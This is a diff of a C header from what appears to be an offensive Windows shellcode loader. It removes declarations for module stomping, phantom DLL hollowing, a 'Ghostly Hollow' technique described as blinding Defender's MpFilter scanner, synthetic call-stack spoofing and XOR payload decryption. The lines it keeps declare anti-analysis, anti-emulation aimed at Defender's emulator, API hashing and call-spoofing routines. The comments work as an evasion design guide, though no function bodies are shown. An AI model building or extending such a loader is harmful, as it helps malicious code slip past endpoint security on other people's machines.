@@ -27,15 +27,6 @@
 // When not defined: memory is PAGE_EXECUTE_READ (W^X).
 // #define RWX_SHELLCODE
 
-// Opt-in: #9 Draugr MVP synthetic-stack RSP swap. When defined, the
-// loader allocates 1 MB and writes three fake return addresses
-// pointing into ntdll/kernel32, then swaps RSP there before executing
-// shellcode. Default off because (a) the 1 MB private allocation is
-// itself a heuristic signal, and (b) the synthetic frames reuse
-// ntdll/kernel32 .pdata which may under-match at unwind time. Enable
-// only after validating with Moneta / Pe-Sieve / WinDbg stack walk.
-// #define ENABLE_SYNTHETIC_STACK
-
 // Subsystem is controlled by build.bat LFLAGS (/SUBSYSTEM:WINDOWS)
 
 // ----------- Debug Logging -----------
@@ -102,21 +93,6 @@ typedef ULONG   (NTAPI* fnRtlRemoveVectoredExceptionHandler)(PVOID Handle);
 typedef VOID    (NTAPI* fnRtlCaptureContext)(PCONTEXT ContextRecord);
 typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);
 
-// Phantom DLL hollowing typedefs (ktmw32 / kernel32)
-typedef HANDLE  (WINAPI* fnCreateTransaction)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
-typedef HANDLE  (WINAPI* fnCreateFileTransactedA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID);
-typedef BOOL    (WINAPI* fnRollbackTransaction)(HANDLE);
-typedef BOOL    (WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
-typedef BOOL    (WINAPI* fnWriteFile2)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
-typedef DWORD   (WINAPI* fnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
-typedef BOOL    (WINAPI* fnCloseHandle2)(HANDLE);
-typedef DWORD   (WINAPI* fnGetTempPathA2)(DWORD, LPSTR);
-typedef BOOL    (WINAPI* fnCopyFileA2)(LPCSTR, LPCSTR, BOOL);
-typedef HANDLE  (WINAPI* fnFindFirstFileA2)(LPCSTR, LPWIN32_FIND_DATAA);
-typedef BOOL    (WINAPI* fnFindNextFileA2)(HANDLE, LPWIN32_FIND_DATAA);
-typedef BOOL    (WINAPI* fnFindClose2)(HANDLE);
-typedef HANDLE  (WINAPI* fnCreateFileA2)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
-
 // ----------- Resolved WinAPI Function Pointers -----------
 typedef struct _API_HASHING {
     fnLoadLibraryA      pLoadLibraryA;
@@ -168,24 +144,6 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
 BOOL InstallExitHook(IN PVOID pNtdll);
 
-// ----------- Module Stomping / Phantom DLL Hollowing / Ghostly Hollow -----------
-BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
-BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
-// Ghostly Hollow: write encrypted shellcode into a FILE_FLAG_DELETE_ON_CLOSE
-// temp DLL → NtCreateSection(SEC_IMAGE) → NtMapViewOfSection → CloseHandle
-// (file disappears) → in-memory XOR decrypt → flip to RX. Skips NTFS
-// transactions entirely so MpFilter's transaction-aware scanner is blind.
-BOOL GhostlyHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
-
-// Helper: pick a sacrificial DLL from the 4-entry allowlist (XSTR_STOMP_DLL_1..4)
-// that is present in System32 AND has an executable section >= dwMinSize.
-// Returns TRUE and fills pOutName (260 bytes) with the chosen filename.
-// pOutFullPath (260 bytes) optional — gets the full path; pass NULL to skip.
-BOOL PickSacrificialDll(IN PAPI_HASHING pApi, IN DWORD dwMinSize, OUT PCHAR pOutName, OUT PCHAR pOutFullPath);
-
-// XOR a buffer in place against a fixed-length cycling key.
-VOID XorBufferInPlace(IN OUT PBYTE pBuf, IN DWORD dwSize, IN PBYTE pKey, IN DWORD dwKeyLen);
-
 // Anti-emulation prologue. Runs API hammering + RDRAND consistency check
 // + CPUID hypervisor brand check. Returns TRUE if execution should continue.
 // Defender's mpengine emulator has ~200ms wall-clock budget and is exhausted
@@ -196,13 +154,6 @@ BOOL AntiEmulation(IN PAPI_HASHING pApi);
 extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
 extern VOID SetSpoofStack(PVOID pSyntheticRsp);
 extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);
-
-// ----------- Synthetic Call Stack Builder (Draugr MVP) -----------
-// Allocates a private 1 MB buffer and fills the top three qwords
-// with RIPs inside RtlUserThreadStart / BaseThreadInitThunk /
-// NtWaitForSingleObject. Returns the buffer's intended RSP (points
-// at the first fake return), or NULL on failure.
-PVOID BuildSyntheticStack(IN PAPI_HASHING pApi);
 
 // ----------- Generic Gadget Pool -----------
 // Holds up to 64 byte-pattern hits harvested from one or more loaded modules.
